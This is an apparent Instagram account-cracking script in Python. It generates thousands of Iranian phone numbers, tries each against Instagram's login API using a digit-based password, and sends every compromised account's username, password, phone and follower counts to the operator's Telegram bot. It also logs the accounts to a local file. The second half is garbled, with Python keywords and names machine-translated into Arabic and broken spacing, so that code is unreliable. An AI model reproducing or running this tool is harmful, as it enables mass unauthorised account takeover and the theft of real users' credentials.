import  sys, os, random, time, user_agent,secrets,requests,json,uuid

from secrets import token_hex

from uuid import uuid4

import pyfiglet

from pyfiglet import figlet_format

logo1 = figlet_format('',font ='devilish')

hk = ('')

nkt = ('-- '*20)

A = "\033[1;91m"

B = "\033[1;90m"

C = "\033[1;97m"

E = "\033[1;92m"

H = "\033[1;93m"

K = "\033[1;94m"

L = "\033[1;95m"

M = "\033[1;96m"

os.system('clear')

os.system('rm -rf .1.txt')

print(M+logo1)

print(K+hk)

print(H+nkt)

token = input(E+"-"+A+"!"+E+"-"+H+ " Enter BoT Token :  "+C)

ID = input(E+"-"+A+"!"+E+"-"+H+ " Enter YouR ID :  "+C)

def ToOLA():

	os.system('clear')	global ID, token 

	ok = 0

	cp = 0

	sk = 0

	os.system('clear')

	os.system('rm -rf .1.txt')

	import time

	def Comb():

		for lik in range(5000):

			A0=random.randint(1000000, 9999999)

			H0=("+98936"+str(A0)+":0936"+str(A0))

			with open(".1.txt", "a") as Ccom:

				Ccom.write(str(H0)+"\n")

	Comb()

	fil=".1.txt"

	file=open(fil,"r").read().splitlines()

	for line in file:

		user=line.split(':')[0]

		pw=line.split(':')[1]

			

		url = 'https://i.instagram.com/api/v1/accounts/login/'

		headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 

        'Accept':'*/*', 

        'Cookie':'missing', 

        'Accept-Encoding':'gzip, deflate', 

        'Accept-Language':'en-US', 

        'X-IG-Capabilities':'3brTvw==', 

        'X-IG-Connection-Type':'WIFI', 

        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 

        'Host':'i.instagram.com'}

		uid = str(uuid4())

		data = {'uuid':uid, 

         'password':pw, 

         'username':user, 

         'device_id':uid, 

         'from_reg':'false', 

         '_csrftoken':'missing', 

         'login_attempt_countn':'0'}

		req = requests.post(url,headers=headers,data=data,allow_redirects=True,verify=True)

		if str("logged_in_user") in req.json():

			ok+=1

			userx = req.json()['logged_in_user']['username']

			try:

				cookiie = secrets.token_hex(8)*2

				head = {

                "HOST": "www.instagram.com"،

                "KeepAlive": "صحيح"،

                "user-agent": "Instagram 113.0.0.39.122 Android (24 / 5.0 ؛ 515 نقطة في البوصة ؛ 1440 × 2416 ؛ huawei / google ؛ Nexus 6P ؛ الصياد ؛ الصياد ؛ en_US)" ،

                "ملف تعريف الارتباط": ملف تعريف الارتباط ،

                'قبول' : "*/*"،

                'ContentType': "application / x-www-form-urlencoded" ،

                "X-Requested-With": "XMLHttpRequest"،

                "X-IG-App-ID": "936619743392459" ،

                "X-Instagram-AJAX": "مفقود"،

                "X-CSRFToken": "مفقود"،

                "Accept-Language": "en-US، ar؛ q = 0.9"}

				aip = 'https://www.instagram.com/'+str(userx)+'/؟__a=1'

				look = calls.get (aip، headers = head) .json ()

				id = str (انظر ['graphql'] ['user'] ['id'])

				name = str (انظر ['graphql'] ['user'] ['full_name'])

				المتابعون = str (look ['graphql'] ['user'] ['edge_followed_by'] ['count'])

				التالي = str (انظر ['graphql'] ['user'] ['edge_follow'] ['count'])

				lok = calls.get ("https://o7aa.pythonanywhere.com/؟id=" + str (id))   

				iok = lok.json ()

				daata = iok ['البيانات']

				

			باستثناء: تمرير

			JoAc = ('◆ ━━━━━━ ◆ ❃ ◆ ━━━━━━ ◆ \ n🩸 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴:' + str (userx) + '\ n🩸 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳:' + str (pw) + '\ n🩸 𝙿𝙷𝙾𝙽𝙴: '+ str (مستخدم) +' \ n🩸 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂: '+ str (متابعون) +' \ n🩸 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶: '+ str (يتبع) +' \ n🩸 𝙳𝙰𝚃𝙴: '+ str (daata) +' \ ن ◆ ━━━━━━ ◆ ❃ ◆ ━━━━━━ ◆ ')

			request.get ("https://api.telegram.org/bot" + str (رمز مميز) + "/ sendMessage؟ chat_id =" + str (ID) + "& text =" + str (JoAc))

			f = open ('WorkAcc.txt'، 'a')

			f.write (JoAc + "\ n")

			f.close ()

				

		str elif ('"message": "التحدي_المطلوب" ، "التحدي"') في req.json ():

				cp + = 1

		آخر:

			os.system ("مسح")

			كورونا + = 1

			طباعة (A + '' + "« "+ E + مستخدم + A +" »" + H + ":" + A + "« "+ E + pw + A +" »")

			طباعة ("{} ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ،" .format (B))

			طباعة ("{} - {}! {} - {} Vaild {}: {} {}". تنسيق (A، E، A، E، A، E، str (ok)) + "{} - {} ! {} - {} SeC {}: {} {} ". تنسيق (A، K، A، K، A، K، str (cp)) +" {} - {}! {} - {} تحقق { }: {} {} ". تنسيق (A، H، A، B، A، H، str (sk)))

			طباعة ("{} ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ، ،" .format (B))

			مطبعة(" ")

تولا ()
